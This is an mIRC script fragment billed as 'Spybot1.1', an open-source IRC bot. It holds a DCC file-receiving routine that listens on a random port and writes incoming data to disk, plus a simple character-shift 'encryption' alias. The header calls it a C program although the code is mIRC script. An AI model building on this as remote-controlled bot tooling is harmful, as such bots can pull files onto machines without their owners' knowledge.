;//////////////////////////////////////////////////////////
;//							//
;//		Spybot1.1 by Mich			//
;//							//
;//		Opensource irc bot 			//
;//							//
;//	    IRC: irc.babbels.com #dreams		//
;//							//
;//	 You can use this code however      		//
;//       you want, as long as i'm given     		//
;//       credit in some way.				//
;//	 This is the first real c program i have        //
;//	 made so there will be some bugs in it.         //
;//	    						//
;//		use at your own risk.			//
;//							//
;//	       Good luck and have fun!			//
;//							//
;//////////////////////////////////////////////////////////



alias getfile {
  :retry
  var %port = $rand(1024,5000)
  if ($portfree(%port) == $false) goto retry
  sockclose xdcc@ $+ $1 $+ @ $+ $replace($nopath($2-),$chr(32),_) %port
  socklisten xdcc@ $+ $1 $+ @ $+ $replace($nopath($2-),$chr(32),_) %port
  raw PRIVMSG $1 :DCC GET $longip($ip) %port " $+ $2-
}

on 1:SOCKLISTEN:xdcc@*: {
  if ($sockerr > 0) halt
  sockclose xdccg@ $+ $gettok($sockname,2-,64)
  sockaccept xdccg@ $+ $gettok($sockname,2-,64)
  sockclose $sockname
}

on 1:SOCKOPEN:xdccg@*: {
  if ($sockerr > 0)  halt
}

on 1:SOCKREAD:xdccg@*: {
  if ($sockerr > 0)  halt
  sockread &bvar
  bwrite $replace($gettok($sockname,3,64),_,$chr(32)) -1 4096 &bvar
  bunset &bvar
}

;simpel encryption fucktie

alias encrypt {
  var %k = $1
  var %c 1
  var %x
  while (%c <= $len($2-)) {
    %x =  %x $+ $chr($calc($asc($mid($2-,%c,1)) + %k + (%c - 1) * 3)) 
    inc %c
  }
  echo -s %x
  clipboard %x 
}
